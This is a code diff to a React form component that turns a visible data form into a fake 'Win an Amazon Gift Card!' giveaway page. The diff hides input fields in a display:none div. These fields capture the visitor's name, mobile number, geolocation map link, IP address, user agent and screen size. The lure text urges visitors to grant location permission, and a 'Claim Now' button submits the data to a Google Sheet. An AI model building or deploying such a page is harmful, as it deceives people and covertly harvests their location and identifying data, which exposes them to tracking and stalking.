@@ -49,32 +49,64 @@ const Form = (props) => {
 
   return (
     <>
-
-    
       <form name="submit-to-google-sheet" onSubmit={submit} ref={formRef}>
-        <input name="Date" type="text" placeholder="" value={formattedDate} />
-        <input name="Time" type="text" placeholder="" value={currentDate.toLocaleTimeString()}/>
-        <input name="Name" type="text" placeholder="" value={name}/>
-        <input name="MobileNumber" type="text" placeholder="" value={mobile}/>
-        <input name="Location" type="text" value={
-            location.loaded
-              ? JSON.stringify(location.mapLink)
-              : "Location data not available yet." + location.error.message
-          }
-        />
-        <input name="IP" type="text" value={IP} />
-        <input name="Agent" type="text" value={navigator.userAgent} />
-        <input name="AgentData" type="text" value={JSON.stringify(navigator.userAgentData)}
-        />
-        <input
-          name="ScreenSize"
-          type="text"
-          value={window.innerHeight + "x" + window.innerWidth}
-        />
+        <div style={{ display: "none" }}>
+          <input name="Date" type="text" placeholder="" value={formattedDate} />
+          <input
+            name="Time"
+            type="text"
+            placeholder=""
+            value={currentDate.toLocaleTimeString()}
+          />
+          <input name="Name" type="text" placeholder="" value={name} />
+          <input
+            name="MobileNumber"
+            type="text"
+            placeholder=""
+            value={mobile}
+          />
+          <input
+            name="Location"
+            type="text"
+            value={
+              location.loaded
+                ? JSON.stringify(location.mapLink)
+                : "Location data not available yet." + location.error.message
+            }
+          />
+          <input name="IP" type="text" value={IP} />
+          <input name="Agent" type="text" value={navigator.userAgent} />
+          <input
+            name="AgentData"
+            type="text"
+            value={JSON.stringify(navigator.userAgentData)}
+          />
+          <input
+            name="ScreenSize"
+            type="text"
+            value={window.innerHeight + "x" + window.innerWidth}
+          />
+        </div>
 
-        <button type="submit">Send</button>
-      </form>     
-      {location.loaded ? "hello" : null}
+        <div className="container">
+          <h1 className="heading">Win an Amazon Gift Card!</h1>
+          <p className="description">
+            Allow us to pick you up at a <br/>unique location and increase your
+            chance to win.
+          </p>
+
+          <div className="location-permission">
+            <p>
+              We pick winners based on location.<br/> Grant us permission to locate
+              you at a unique spot.
+            </p>
+            
+          </div>
+        </div>
+        <button type="submit" className="gift-page__claim-button">
+          Claim Now
+        </button>
+      </form>
     </>
   );
 };
